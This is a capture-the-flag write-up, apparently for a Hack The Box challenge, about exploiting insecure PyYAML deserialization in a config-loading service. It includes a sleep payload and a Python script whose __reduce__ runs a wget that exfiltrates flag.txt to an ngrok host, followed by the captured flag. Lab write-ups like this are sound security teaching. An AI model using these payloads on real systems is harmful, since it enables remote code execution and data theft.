When we connect to this service we have a system that allows us to create a config and load a config.

![image](https://user-images.githubusercontent.com/80063008/227539600-3c19ff02-4213-4c1d-9c75-b9d48dfad460.png)

Creating a config gives us some serialized Base64 encoded data.

Decoding the data, we notice it is python serialized data.

![image](https://user-images.githubusercontent.com/80063008/227539798-c86c3c60-8531-4827-9d0a-fedd78e6ceb3.png)

Some research online reveals this is pyyaml serialization. We can find some payloads to test here:
https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#summary

Starting slowly with a sleep command:

```python
!!python/object/apply:time.sleep [10]
```
We Base64 encode and send it as input to the `Load Config` option and the server hangs for 10 seconds confirming we have command execution.

I then used this script to exfiltrate the flag:

```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import os
import base64

class Payload(object):
    def __reduce__(self):
        return (os.system,('wget https://e7f1-86-121-46-6.eu.ngrok.io/`cat flag.txt`',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(base64.b64encode(deserialized_data.encode()).decode())
```

This creates the Base64 encoded data I need to send. Once I do, I get the flag in my python listener:

![image](https://user-images.githubusercontent.com/80063008/227540727-2217b1ae-01cf-47fe-957a-5fcf10a71b6c.png)

HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
